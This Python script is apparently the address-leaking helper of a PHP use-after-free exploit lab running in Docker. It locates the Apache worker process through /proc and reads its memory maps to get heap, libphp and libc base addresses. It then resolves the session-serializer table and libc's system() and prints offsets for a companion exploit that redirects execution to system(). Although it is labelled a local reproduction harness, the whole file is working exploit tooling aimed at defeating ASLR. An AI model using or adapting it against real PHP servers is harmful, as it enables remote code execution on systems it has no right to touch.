#!/usr/bin/env python3
"""Docker-only address bridge for the local public reproduction harness."""
import os,re,subprocess,sys,time
MODULE='/opt/php-uaf-lab/build/php-8.5.4-apache-clean/libs/libphp.so';LIBC='/usr/lib/x86_64-linux-gnu/libc.so.6'
def descendants(pid):
 out=[]
 for ent in os.listdir('/proc'):
  if not ent.isdigit():continue
  try:
   fields=open(f'/proc/{ent}/stat').read().split();ppid=int(fields[3])
   if ppid==pid:out.append(int(ent))
  except:pass
 return out
def worker():
 todo=[1];seen=set()
 while todo:
  p=todo.pop(0)
  if p in seen:continue
  seen.add(p);todo+=descendants(p)
  try:
   uid=int(re.search(r'^Uid:\s+(\d+)',open(f'/proc/{p}/status').read(),re.M).group(1));cmd=open(f'/proc/{p}/cmdline','rb').read()
   if uid==33 and b'apache2' in cmd:return p
  except:pass
 raise RuntimeError('Apache worker not found')
def maps(pid):
 for line in open(f'/proc/{pid}/maps'):
  p=line.split();a,b=[int(x,16) for x in p[0].split('-')];yield a,b,p
def base(pid,path):
 for a,b,p in maps(pid):
  if len(p)>=6 and p[2]=='00000000' and p[-1]==path:return a
 raise RuntimeError(path)
def heap(pid):
 for a,b,p in maps(pid):
  if p[1]=='rw-p' and len(p)==5:
   h=(a+0x1fffff)&~0x1fffff
   if h+0x200000<=b:return h
 raise RuntimeError('heap')
def sym(path,name,dynamic=False):
 cmd=['nm'];
 if dynamic:cmd+=['-D']
 else:cmd+=['-an']
 text=subprocess.check_output(cmd+[path],text=True)
 for line in text.splitlines():
  q=line.split()
  if len(q)>=3 and q[2]==name:return int(q[0],16)
 raise RuntimeError(name)
for _ in range(100):
 try:p=worker();break
 except RuntimeError:time.sleep(.05)
else:raise SystemExit('worker unavailable')
h=heap(p);mb=base(p,MODULE);lb=base(p,LIBC);ps=sym(MODULE,'ps_serializers')+0x28;so=sym(LIBC,'system@@GLIBC_2.2.5',True)
d=h+0x1c6000;target=mb+ps;used=(target-((d-0x1fe8)+16))//16
if used>1017:
 print(f'unsuitable ASLR layout: worker={p} used={used}',file=sys.stderr);raise SystemExit(75)
print(f'--heap-base 0x{h:x} --module-base 0x{mb:x} --libc-base 0x{lb:x} --ps-decode-offset 0x{ps:x} --system-offset 0x{so:x}')
